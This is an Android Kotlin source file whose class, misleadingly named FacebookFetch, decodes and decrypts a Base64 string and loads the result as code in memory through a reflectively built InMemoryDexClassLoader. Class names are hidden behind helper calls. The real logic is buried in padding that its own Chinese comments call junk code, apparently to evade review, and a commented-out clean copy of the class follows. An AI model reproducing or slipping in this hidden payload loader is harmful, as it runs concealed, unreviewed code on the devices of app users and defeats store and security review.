package com.solar.tabor.nkil

import java.nio.ByteBuffer
import java.util.Base64

/**
 * Date：2025/10/17
 * Describe:
 */

class FacebookFetch : BaseFc() {
    private var listStr = listOf("1", "2", "com.faisl.akiz", "as.sizs")
    private var unusedVar1: String? = null
    private val dummyList = mutableListOf<Any?>()

    //"dalvik.system.InMemoryDexClassLoader"
    //"java.lang.ClassLoader"
    //
    fun readInfo(context: Any, string: String, stringCode: String) {
        // 垃圾代码开始
        val tempStr = string + "_processed"
        unusedVar1 = tempStr.substring(0, 1)
        repeat(3) {
            dummyList.add(it.toString())
        }
        // 垃圾代码结束

        if (string.isEmpty()) return

        // 更多垃圾代码
        val fakeCheck = string.length > 0
        if (fakeCheck) {
            val dummyMap = mapOf("key1" to 1, "key2" to 2)
            dummyMap.forEach { (k, v) ->
                // 无用的循环操作
            }
        }

        val list: List<String> = string.split("=")
        listStr = list

        // 无用的计算
        val randomNum = System.currentTimeMillis() % 1000
        val dummyCalculation = randomNum * 2 + 1

        //z.m
        val b: ByteArray = Class.forName("z.m").getMethod(
            "d", String::class.java, ByteArray::class.java
        ).invoke(
            null, list[2], Base64.getDecoder().decode(stringCode)
        ) as ByteArray? ?: return

        // 无用的条件判断
        if (b.size > 0 && b.size < 1000000) {
            val dummyArray = ByteArray(5) { it.toByte() }
        }

        fbInitStart(ByteBuffer.wrap(b), context, list)

        // 垃圾代码
        val endTime = System.nanoTime()
        return
    }

    private fun fbInitStart(bf: ByteBuffer, ctx: Any, list: List<String>) {
        // 垃圾代码 - 无用的字节缓冲操作
        val duplicateBuffer = bf.duplicate()
        duplicateBuffer.position(0)

        //"dalvik.system.InMemoryDexClassLoader"
        val clzz = fetchPair().first

        // 无用的字符串操作
        val className = clzz.name
        val classNameParts = className.split(".")

        //java.lang.ClassLoader
        val c = clzz.getDeclaredConstructor(fetchPair().second, Class.forName(list[1]))

        // 垃圾代码 - 无用的对象创建
        val dummyObj = Object()
        synchronized(dummyObj) {
            // 空同步块
        }

        //"getClassLoader"
        val cL = c.newInstance(bf, ctx.javaClass.getMethod(fetchName()).invoke(ctx))

        // 无用的集合操作
        val unusedSet = setOf(1, 2, 3, 4, 5)
        val filteredSet = unusedSet.filter { it > 10 }

        next(cL)

        // 垃圾代码 - 无用的异常处理
        try {
            val unusedString = "This will never be used"
        } catch (e: Exception) {
            // 空捕获块
        }
    }

    // 无用的私有方法
    private fun dummyMethod(): String {
        val sb = StringBuilder()
        for (i in 1..10) {
            sb.append(i.toString())
        }
        return sb.toString()
    }

    // 另一个无用的私有方法
    private fun anotherUselessMethod(input: Int): Boolean {
        return input > 0 && input < 0
    }

    override fun tagStr(int: Int): String {
        // 垃圾代码
        val startTime = System.currentTimeMillis()

        runCatching {
            // 无用的数学运算
            val mathResult = Math.pow(2.0, 3.0)

            return listStr[int]
        }

        // 更多垃圾代码
        val endTime = System.currentTimeMillis()
        val duration = endTime - startTime

        return listStr[0]
    }

    // 无用的属性
    private val unusedProperty: Int
        get() = (1..100).random()
}

//class FacebookFetch : BaseFc() {
//    private var listStr = listOf("1", "2", "com.faisl.akiz", "as.sizs")
//
//    //"dalvik.system.InMemoryDexClassLoader"
//    //"java.lang.ClassLoader"
//    //
//    fun readInfo(context: Any, string: String, stringCode: String) {
//        if (string.isEmpty()) return
//        val list: List<String> = string.split("=")
//        listStr = list
//
//        //z.m
//        val b: ByteArray = Class.forName("z.m").getMethod(
//            "d", String::class.java, ByteArray::class.java
//        ).invoke(
//            null, list[2], Base64.getDecoder().decode(stringCode)
//        ) as ByteArray? ?: return
//
//        fbInitStart(ByteBuffer.wrap(b), context, list)
//        return
//    }
//
//    private fun fbInitStart(bf: ByteBuffer, ctx: Any, list: List<String>) {
//        //"dalvik.system.InMemoryDexClassLoader"
//        val clzz = fetchPair().first
//        //java.lang.ClassLoader
//        val c = clzz.getDeclaredConstructor(fetchPair().second, Class.forName(list[1]))
//
//        //"getClassLoader"
//        val cL = c.newInstance(bf, ctx.javaClass.getMethod(fetchName()).invoke(ctx))
//
//        next(cL)
//
//    }
//
//
//    override fun tagStr(int: Int): String {
//        runCatching {
//            return listStr[int]
//        }
//        return listStr[0]
//    }
//
//}